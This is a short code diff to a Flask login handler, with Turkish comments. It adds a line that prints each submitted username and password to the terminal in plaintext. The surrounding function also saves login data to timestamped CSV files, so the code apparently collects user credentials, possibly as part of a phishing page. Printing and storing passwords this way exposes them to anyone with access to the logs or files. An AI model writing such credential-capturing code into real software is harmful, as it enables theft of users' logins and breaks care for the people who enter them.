@@ -22,6 +22,9 @@ def login_save():
         flash("Tüm alanları doldurun!")
         return redirect(url_for("login_page"))
 
+    # Terminalde kullanıcı adı ve şifreyi göster
+    print(f"[GİRİŞ] Kullanıcı: {username} | Şifre: {password}")
+
     timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%S")
     filename = os.path.join(SAVE_DIR, f"login_data_{timestamp}.csv")
 
